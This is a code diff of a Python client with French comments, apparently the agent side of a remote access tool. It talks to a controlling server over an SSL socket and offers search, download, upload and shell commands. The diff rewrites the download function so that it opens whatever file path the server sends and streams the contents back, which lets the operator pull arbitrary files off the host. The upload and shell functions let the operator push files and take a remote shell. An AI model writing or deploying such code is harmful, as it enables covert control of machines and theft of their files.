@@ -23,25 +23,20 @@ def menu_help(ssl_socket):
 
 # Fonction permettant d'envoyer un fichier au serveur
 def download(ssl_socket):
-    filename = ssl_socket.recv(4096).decode()
-    
-    disk_root = ("/")
-    results_filename = []
-    
-    for root, dirs, files in os.walk(disk_root): # Recherche du fichier à la racine
-        try:
-            if filename in files:
-                results_filename.append(os.path.join(root, filename))
-                print(results_filename)
-        
-            if results_filename:
-                results_to_send = "\n".join(f"      -> ({i + 1}: {path}" for i, path in enumerate(results_filename))
-                ssl_socket.send(results_to_send.encode())
-            
-            else:
-                ssl_socket.send(b"no results")
-        except Exception as e:
-            ssl_socket.send(f"Erreur: {str(e)}".encode)
+    try:
+        fichier_received = ssl_socket.recv(4096).decode()  # Réception du chemin du fichier à envoyer
+        with open(fichier_received, 'rb') as file:
+            while True:
+                fichier_to_send = file.read(4096)
+                if not fichier_to_send:
+                    break
+                ssl_socket.sendall(fichier_to_send)  # Envoi des données du fichier
+        ssl_socket.send(b'END')  # Envoi d'un délimiteur final
+        print(f"[+] Le fichier '{fichier_received}' a été envoyé avec succès.")
+    except Exception as e:
+        message_erreur = f"[!] Erreur lors de l'envoi du fichier '{fichier_received}': {str(e)}"
+        ssl_socket.send(message_erreur.encode())
+
 
 # Fonction permettant de recevoir un fichier du serveur
 def upload(ssl_socket):
@@ -55,7 +50,8 @@ def upload(ssl_socket):
                     break
                 file.write(chunk)
     except Exception as e:
-        return(f"Erreur lors de la réception du fichier")
+        message_erreur = f"[!] Erreur lors de la réception du fichier"
+        ssl_socket.send(message_erreur.encode())
         
 # Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
@@ -154,7 +150,7 @@ def main():
             elif command.lower().startswith('search'):
                 search(ssl_socket)
             elif command.lower() == 'download':
-                search(ssl_socket)#modif
+                search(ssl_socket)
                 download(ssl_socket)
             elif command.lower() == 'upload':
                 upload(ssl_socket)
